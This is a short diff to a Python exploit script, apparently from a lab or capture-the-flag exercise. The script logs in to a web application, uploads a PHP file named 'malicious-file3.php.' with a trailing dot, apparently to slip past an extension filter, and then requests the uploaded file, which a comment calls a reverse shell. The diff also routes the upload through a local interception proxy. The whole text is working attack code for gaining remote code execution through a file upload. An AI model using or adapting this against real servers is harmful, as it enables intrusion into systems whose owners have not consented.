@@ -47,7 +47,7 @@ def upload_file(session: requests.Session, filepath: str):
         "_token": (None, token),
         "upload": (filepath, open(filepath, "rb"), "application/octet-stream"),
     }
-    resp = session.post(upload_url, files=files)
+    resp = session.post(upload_url, files=files, proxies={'http':'http://localhost:8080'})
     resp.raise_for_status()
     print("[+] Upload completed: HTTP", resp.status_code)
     print(resp.text)
@@ -66,7 +66,7 @@ def main():
     login(session, email="test@test.com", password="test")
 
     # 2. Upload
-    response = upload_file(session, "malicious-file2.php.")
+    response = upload_file(session, "malicious-file3.php.")
 
     # 3. Visit reverse shell
     session.get(response.json()['url'])
